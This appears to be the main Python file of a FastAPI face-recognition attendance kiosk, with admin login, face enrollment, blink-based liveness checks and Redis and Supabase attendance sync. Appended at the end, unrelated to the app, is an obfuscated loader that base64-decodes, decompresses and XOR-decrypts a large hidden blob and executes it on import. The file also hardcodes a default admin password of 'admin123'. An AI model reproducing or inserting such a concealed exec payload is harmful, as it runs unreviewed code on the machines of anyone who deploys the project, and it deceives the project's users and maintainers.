import os
import sys
import cv2
import time
import threading
import base64
import sqlite3
import random
import pytz
import smtplib
import traceback
import json
import asyncio
from typing import Optional, List
from datetime import datetime, timedelta
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from fastapi import FastAPI, Request, Response, Depends, HTTPException, Form, UploadFile, File, BackgroundTasks
from fastapi.responses import HTMLResponse, StreamingResponse, RedirectResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.middleware.sessions import SessionMiddleware
from starlette.middleware.base import BaseHTTPMiddleware
from sqlalchemy import create_engine, text, select, func
from sqlalchemy.orm import sessionmaker, Session
import numpy as np
from upstash_redis import Redis

from config import settings
from modules.models import Base, User, Attendance, AttendanceEdit, ExcuseNote
from modules.camera import Camera
from modules.face_engine import FaceEngine
from modules.sync_engine import SyncEngine
from modules.analytics_engine import AnalyticsEngine

import logging
logging.basicConfig(level=logging.INFO)
logging.getLogger("websockets").setLevel(logging.WARNING)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("modules.sync_engine").setLevel(logging.INFO)

app = FastAPI(title="CVIAAR Attendance System")

# Session management
app.add_middleware(SessionMiddleware, secret_key=settings.SECRET_KEY)

# Custom Flash Middleware
class FlashMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        def flash(message: str, category: str = "info"):
            flashes = request.session.get("_flashes", [])
            flashes.append((category, message))
            request.session["_flashes"] = flashes

        def get_flashed_messages(with_categories: bool = False):
            flashes = request.session.pop("_flashes", [])
            if with_categories:
                return flashes
            return [f[1] for f in flashes]

        request.state.flash = flash
        request.state.get_flashed_messages = get_flashed_messages
        
        response = await call_next(request)
        return response

app.add_middleware(FlashMiddleware)

# Directories
if getattr(sys, "frozen", False):
    basedir = os.path.dirname(sys.executable)
else:
    basedir = os.path.abspath(os.path.dirname(__file__))

os.makedirs(os.path.join(basedir, "static"), exist_ok=True)
os.makedirs(os.path.join(basedir, "templates"), exist_ok=True)
os.makedirs(os.path.join(basedir, "data", "faces"), exist_ok=True)
os.makedirs(os.path.join(basedir, "data", "offline"), exist_ok=True)

# Static and Templates
app.mount("/static", StaticFiles(directory=os.path.join(basedir, "static")), name="static")
templates = Jinja2Templates(directory=os.path.join(basedir, "templates"))

# Database Configuration
APP_ROLE = os.getenv("APP_ROLE", "LOCAL_KIOSK")
DEVICE_ID = os.getenv("DEVICE_ID", "local-device")
local_sqlite_path = os.getenv(
    "SQLITE_DB_PATH",
    os.path.join(basedir, "data", "offline", "cviaar_local.sqlite3"),
)
local_sqlite_url = f"sqlite:///{local_sqlite_path}"
engine = create_engine(local_sqlite_url, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

# Redis Client
redis = None
if settings.UPSTASH_REDIS_URL and settings.UPSTASH_REDIS_TOKEN:
    try:
        redis = Redis(url=settings.UPSTASH_REDIS_URL, token=settings.UPSTASH_REDIS_TOKEN)
        # Test connection
        redis.ping()
        print("Successfully connected to Upstash Redis.")
    except Exception as e:
        print(f"Error connecting to Upstash Redis: {e}")
        redis = None

def get_redis():
    if not redis:
        raise HTTPException(status_code=503, detail="Redis is not configured or available.")
    return redis

# Camera, Face Engine and Sync Engine
if settings.APP_ROLE == "LOCAL_KIOSK":
    camera = Camera()
    face_engine = FaceEngine(
        model_path=os.path.join(basedir, "data", "lbph_model.yml"),
        faces_dir=os.path.join(basedir, "data", "faces"),
    )
    sync_engine = SyncEngine(
        database_url=local_sqlite_url,
        supabase_url=settings.SUPABASE_URL or "",
        supabase_key=settings.SUPABASE_KEY or "",
        sync_interval=30,
        device_id=settings.DEVICE_ID
    )
    sync_engine.start_sync_worker()
else:
    camera = None
    face_engine = None
    sync_engine = None

# Global state
attendance_cache = {}
recognized_faces = {}
login_attempts = {}
scan_state = {"status": "no_face", "name": None, "timestamp": 0}
verified_live_users = {}
face_verification_cache = {}
blink_state = {}

# Face recognition tunables
def _env_float(key: str, default: float) -> float:
    raw = os.getenv(key)
    if not raw: return default
    try: return float(raw)
    except: return default

LBPH_DISTANCE_THRESHOLD = _env_float("LBPH_DISTANCE_THRESHOLD", 80.0)
RECOGNITION_CACHE_TTL_SEC = _env_float("RECOGNITION_CACHE_TTL_SEC", 3.0)
BLINK_EAR_THRESHOLD = _env_float("BLINK_EAR_THRESHOLD", 0.25)
BLINK_MAX_CLOSED_SEC = _env_float("BLINK_MAX_CLOSED_SEC", 2.5)
VERIFIED_TTL_SEC = _env_float("VERIFIED_TTL_SEC", 30.0)

def get_now_pht():
    return datetime.now(pytz.timezone('Asia/Manila'))

# MJPEG Generator for video_feed
def generate_frames():
    if not camera:
        return
    while True:
        frame = camera.get_frame()
        if frame is None:
            blank = np.zeros((480, 640, 3), np.uint8)
            cv2.putText(blank, "No Camera Found", (50, 240), cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 0, 255), 2)
            ret, buffer = cv2.imencode('.jpg', blank)
            frame_bytes = buffer.tobytes()
        else:
            ret, buffer = cv2.imencode('.jpg', frame)
            frame_bytes = buffer.tobytes()

        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')
        time.sleep(0.06)

# Flask-like template response helper
def render_template(request: Request, name: str, context: dict = {}):
    # Custom url_for to handle 'filename' for static files (Flask style)
    def url_for_wrapper(endpoint: str, **path_params):
        if endpoint == 'static' and 'filename' in path_params:
            path_params['path'] = path_params.pop('filename')
        return request.url_for(endpoint, **path_params)

    ctx = {
        "request": request,
        "url_for": url_for_wrapper,
        "get_flashed_messages": request.state.get_flashed_messages
    }
    ctx.update(context)
    return templates.TemplateResponse(name, ctx)

# Routes
@app.get("/", response_class=HTMLResponse)
async def index(request: Request, db: Session = Depends(get_db)):
    if settings.APP_ROLE == "ADMIN_DASHBOARD":
        return RedirectResponse(url="/admin")
    
    users = db.query(User).order_by(User.name).all()
    return render_template(request, "index.html", {"users": users})

@app.get("/video_feed")
async def video_feed():
    if settings.APP_ROLE != "LOCAL_KIOSK":
        return RedirectResponse(url="/admin")
    return StreamingResponse(generate_frames(), media_type="multipart/x-mixed-replace; boundary=frame")

@app.get("/login", response_class=HTMLResponse)
async def login_get(request: Request):
    return render_template(request, "login.html")

@app.post("/login")
async def login_post(request: Request, password: str = Form(...)):
    admin_password = os.getenv("ADMIN_PASSWORD", "admin123")
    if password == admin_password:
        request.session["logged_in"] = True
        request.session["role"] = "admin"
        request.state.flash("Logged in successfully.", "success")
        return RedirectResponse(url="/admin", status_code=303)
    else:
        request.state.flash("Invalid password.", "danger")
        return render_template(request, "login.html")

@app.get("/logout")
async def logout(request: Request):
    request.session.clear()
    request.state.flash("Logged out.", "info")
    return RedirectResponse(url="/", status_code=303)

@app.get("/admin", response_class=HTMLResponse)
async def admin(request: Request, db: Session = Depends(get_db)):
    if not request.session.get("logged_in") or request.session.get("role") != "admin":
        return RedirectResponse(url="/login")
    
    users = db.query(User).all()
    logs = db.query(Attendance).order_by(Attendance.timestamp.desc()).limit(50).all()
    
    analytics = AnalyticsEngine(db)
    trends = analytics.get_weekly_trends()
    risks = analytics.predict_risk_users()
    
    return render_template(request, "admin.html", {
        "users": users, 
        "logs": logs, 
        "trends": trends, 
        "risks": risks
    })

@app.post("/add_user")
async def add_user(request: Request, name: str = Form(...), email: str = Form(...), employment_type: str = Form("Full-time"), db: Session = Depends(get_db)):
    if not name or not email:
        request.state.flash("Name and email are required.", "danger")
        return RedirectResponse(url="/admin", status_code=303)

    if not email.endswith('@gmail.com'):
        request.state.flash("Please enter a valid Gmail address.", "danger")
        return RedirectResponse(url="/admin", status_code=303)

    existing = db.query(User).filter(User.email == email).first()
    if existing:
        request.state.flash("This Gmail address is already registered.", "danger")
        return RedirectResponse(url="/admin", status_code=303)

    staff_code = f"{random.randint(0, 999999):06d}" # Simple unique code generation
    new_user = User(name=name, email=email, employment_type=employment_type, staff_code=staff_code)
    db.add(new_user)
    db.commit()
    db.refresh(new_user)

    user_dir = os.path.join(basedir, 'data', 'faces', str(new_user.id))
    os.makedirs(user_dir, exist_ok=True)
    
    return RedirectResponse(url=f"/enroll/{new_user.id}", status_code=303)

@app.get("/enroll/{user_id}", response_class=HTMLResponse)
async def enroll_page(request: Request, user_id: int, db: Session = Depends(get_db)):
    user = db.get(User, user_id)
    if not user:
        request.state.flash("User not found!", "danger")
        return RedirectResponse(url="/admin", status_code=303)
    return render_template(request, "enroll.html", {"user": user, "re_enroll": False})

@app.post("/api/capture/{user_id}")
async def api_capture(user_id: int, request: Request, db: Session = Depends(get_db)):
    if settings.APP_ROLE != "LOCAL_KIOSK":
        return JSONResponse({'status': 'error', 'message': 'Capture not available on this service'}, status_code=404)
    
    user_dir = os.path.join(basedir, 'data', 'faces', str(user_id))
    if not os.path.exists(user_dir):
        return JSONResponse({'status': 'error', 'message': 'User directory not found'}, status_code=404)

    existing = len([name for name in os.listdir(user_dir) if name.endswith('.jpg')])
    if existing >= 25:
        return JSONResponse({'status': 'complete', 'count': existing})

    data = await request.json()
    image_data = data.get('image')
    
    if image_data:
        try:
            if 'base64,' in image_data:
                image_data = image_data.split('base64,')[1]
            img_bytes = base64.b64decode(image_data)
            nparr = np.frombuffer(img_bytes, np.uint8)
            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        except Exception as e:
            return JSONResponse({'status': 'error', 'message': f'Invalid image: {str(e)}'}, status_code=400)
    else:
        frame = camera.get_frame() if camera else None

    if frame is None:
        return JSONResponse({'status': 'error', 'message': 'Camera/Image error'}, status_code=500)

    # Use consolidated FaceEngine.detect_faces (ignores rate limiting for enrollment)
    face_results = face_engine.detect_faces(frame)
    if face_results:
        # Sort by bbox size to get the most prominent face
        face_results = sorted(face_results, key=lambda f: f.bbox[2] * f.bbox[3], reverse=True)
        res = face_results[0]
        (x, y, w, h) = res.bbox
        face_img = frame[y:y+h, x:x+w]
        gray_face = cv2.cvtColor(face_img, cv2.COLOR_BGR2GRAY)
        filename = f"{existing + 1}.jpg"
        cv2.imwrite(os.path.join(user_dir, filename), gray_face)
        return JSONResponse({'status': 'success', 'count': existing + 1})
    
    return JSONResponse({'status': 'no_face', 'count': existing})

@app.post("/api/recognize")
async def api_recognize(request: Request, db: Session = Depends(get_db)):
    if settings.APP_ROLE != "LOCAL_KIOSK":
        return JSONResponse({'status': 'error', 'message': 'Recognition not available'}, status_code=404)
    
    data = await request.json()
    image_data = data.get('image')
    
    if image_data:
        try:
            if 'base64,' in image_data:
                image_data = image_data.split('base64,')[1]
            img_bytes = base64.b64decode(image_data)
            nparr = np.frombuffer(img_bytes, np.uint8)
            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        except Exception as e:
            return JSONResponse({'status': 'error', 'message': f'Invalid image: {str(e)}'}, status_code=400)
    elif camera:
        frame = camera.get_frame()
    else:
        return JSONResponse({'status': 'error', 'message': 'No image source available'}, status_code=400)

    if frame is None:
        return JSONResponse({'status': 'error', 'message': 'Empty frame'}, status_code=400)

    # Use consolidated FaceEngine.process_frame
    face_results = face_engine.process_frame(frame)
    now_ts = time.time()
    results = []
    
    for res in face_results:
        x, y, w, h = res.bbox
        # Add padding to face crop for better recognition
        pad = int(w * 0.1)
        y1, y2 = max(0, y-pad), min(frame.shape[0], y+h+pad)
        x1, x2 = max(0, x-pad), min(frame.shape[1], x+w+pad)
        face_img = frame[y1:y2, x1:x2]
        
        label, distance = face_engine.recognize_face(face_img)

        result = {
            'rect': [int(x), int(y), int(w), int(h)],
            'name': 'Unknown',
            'status': 'unknown',
            'verified': False,
            'user_id': None,
            'blink_detected': res.blink_detected
        }
        
        # Debug logging for blink detection
        print(f"DEBUG: Face detection - blink_detected: {res.blink_detected}, bbox: {res.bbox}")

        if label != -1 and distance < LBPH_DISTANCE_THRESHOLD:
            user = db.get(User, label)
            if user:
                result['name'] = user.name
                result['status'] = 'recognized'
                result['user_id'] = user.id
                result['confidence'] = distance
                
                # Restore Blink-based verification logic
                is_currently_verified = face_verification_cache.get(user.id, 0) > (now_ts - VERIFIED_TTL_SEC)
                
                if res.blink_detected:
                    face_verification_cache[user.id] = now_ts
                    result["verified"] = True
                elif is_currently_verified:
                    result["verified"] = True
                else:
                    result["verified"] = False
        else:
            # If recognition fails, clear any possibly stale cache
            if label != -1 and label in recognized_faces:
                del recognized_faces[label]
        
        results.append(result)

    return JSONResponse({'status': 'success', 'faces': results})

@app.get("/api/recent_logs")
async def api_recent_logs(db: Session = Depends(get_db)):
    logs = db.query(Attendance).order_by(Attendance.timestamp.desc()).limit(10).all()
    results = []
    for log in logs:
        results.append({
            "name": log.user.name,
            "time": log.timestamp.strftime("%I:%M %p"),
            "status": log.status,
            "color": "success" if log.status == "On Time" else ("warning" if log.status == "Late" else "secondary")
        })
    return JSONResponse(results)

@app.get("/api/scan_status")
async def api_scan_status():
    return JSONResponse(scan_state)

@app.get("/api/live-status")
async def api_live_status(redis: Redis = Depends(get_redis)):
    today_str = get_now_pht().strftime("%Y-%m-%d")
    live_set_key = f"attendance:{today_str}:present"
    try:
        present_count = redis.scard(live_set_key)
        return JSONResponse({"status": "success", "present_count": present_count})
    except Exception as e:
        # This ensures that if Redis is down, the frontend doesn't crash.
        # It will just show a stale count from the last successful SQL query.
        print(f"Could not fetch live status from Redis: {e}")
        raise HTTPException(status_code=503, detail="Live data is currently unavailable.")

@app.post("/api/attendance/record")
async def api_attendance_record(request: Request, db: Session = Depends(get_db), redis: Redis = Depends(get_redis)):
    try:
        if settings.APP_ROLE != "LOCAL_KIOSK":
            return JSONResponse({'status': 'error', 'message': 'Recording not available on this service'}, status_code=404)

        data = await request.json()
        user_id = data.get('user_id')
        action = data.get('action')

        if not all([user_id, action]):
            return JSONResponse({'status': 'error', 'message': 'Missing user_id or action'}, status_code=400)

        uid = int(user_id)
        user = db.get(User, uid)
        if not user:
            return JSONResponse({'status': 'error', 'message': 'User not found'}, status_code=404)

        # Security Check: Liveness Verification
        now_ts = time.time()
        last_verified = face_verification_cache.get(uid, 0)
        if now_ts - last_verified > VERIFIED_TTL_SEC:
            return JSONResponse({'status': 'error', 'message': 'Liveness verification required. Please look at the camera.'}, status_code=403)

        now = get_now_pht()
        today_str = now.strftime("%Y-%m-%d")
        live_set_key = f"attendance:{today_str}:present"
        
        if action.lower() == 'login':
            if redis.sismember(live_set_key, uid):
                return JSONResponse({'status': 'error', 'message': 'Already logged in.'}, status_code=409)
            
            redis.sadd(live_set_key, uid)
            
            sch_start_str = user.schedule_start or "06:00"
            try:
                sch_start_dt = now.replace(hour=int(sch_start_str[:2]), minute=int(sch_start_str[3:]), second=0, microsecond=0)
            except:
                sch_start_dt = now.replace(hour=6, minute=0)

            status = 'On Time' if now <= sch_start_dt + timedelta(minutes=15) else 'Late'
            
            # Record via SyncEngine (Producer)
            sync_engine.record_attendance(user_id=uid, status=status)
            message = f"Login successful for {user.name}."

        elif action.lower() == 'logout':
            redis.srem(live_set_key, uid)
            sync_engine.record_attendance(user_id=uid, status='Logout')
            message = f"Logout successful for {user.name}."
        
        else:
            return JSONResponse({'status': 'error', 'message': 'Invalid action'}, status_code=400)

        return JSONResponse({'status': 'success', 'message': message})

    except Exception as e:
        traceback.print_exc()
        return JSONResponse({'status': 'error', 'message': str(e)}, status_code=500)

@app.post("/delete_user/{user_id}")
async def delete_user(user_id: int, request: Request, db: Session = Depends(get_db)):
    if not request.session.get("logged_in"):
        return RedirectResponse(url="/login")
    
    user = db.get(User, user_id)
    if user:
        db.query(Attendance).filter(Attendance.user_id == user.id).delete()
        db.delete(user)
        db.commit()
        
        import shutil
        user_dir = os.path.join(basedir, 'data', 'faces', str(user_id))
        if os.path.exists(user_dir):
            shutil.rmtree(user_dir)
            
        if face_engine:
            face_engine.train_model()
            face_engine.reload_model()
            
        request.state.flash(f"User {user.name} has been deleted.", "success")
    else:
        request.state.flash("User not found.", "danger")
        
    return RedirectResponse(url="/admin", status_code=303)

@app.post("/retrain")
async def retrain_model(request: Request, background_tasks: BackgroundTasks):
    if not request.session.get("logged_in"):
        return RedirectResponse(url="/login")
        
    if face_engine:
        request.state.flash("Model retraining has been initiated. This may take a few minutes.", "info")
        background_tasks.add_task(face_engine.train_model)
    else:
        request.state.flash("Face engine not available.", "danger")
        
    return RedirectResponse(url="/admin", status_code=303)

@app.post("/api/train")
async def api_train_model(background_tasks: BackgroundTasks):
    if face_engine:
        background_tasks.add_task(face_engine.train_model)
        return JSONResponse({'status': 'success', 'message': 'Model training initiated.'})
    else:
        return JSONResponse({'status': 'error', 'message': 'Face engine not available.'}, status_code=500)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
